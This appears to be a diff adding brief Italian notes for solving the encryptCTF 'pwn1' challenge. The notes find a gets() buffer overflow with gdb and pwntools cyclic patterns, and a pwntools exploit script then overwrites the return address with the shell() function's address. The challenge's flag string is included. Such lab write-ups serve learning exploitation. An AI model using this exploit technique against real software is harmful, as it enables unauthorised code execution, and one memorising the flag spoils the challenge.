@@ -1,0 +1,28 @@
+analizzare il codice del programma fornito
+verificare che la funzione shell() non viene mai chiamata dal main
+individuare la vulnerabilità → uso della funzione gets()
+
+gdb pwn1
+info functions
+shell → 0x080484ad
+python3 -c "from pwn import *; print(cyclic(300))" > pat300
+run < pat300
+EIP = 0x616b6261
+python3 -c "from pwn import *; print(cyclic_find(p32(0x616b6261)))"
+
+from pwn import *
+
+p = process('./pwn1')
+
+offset = 140
+shell_addr = 0x080484ad
+
+payload = b"A"*offset + p32(shell_addr)
+
+p.sendline(payload)
+p.interactive()
+
+python3 exploit.py
+cat flag.txt
+encryptCTF{Buff3R_0v3rfl0W5_4r3_345Y}
+
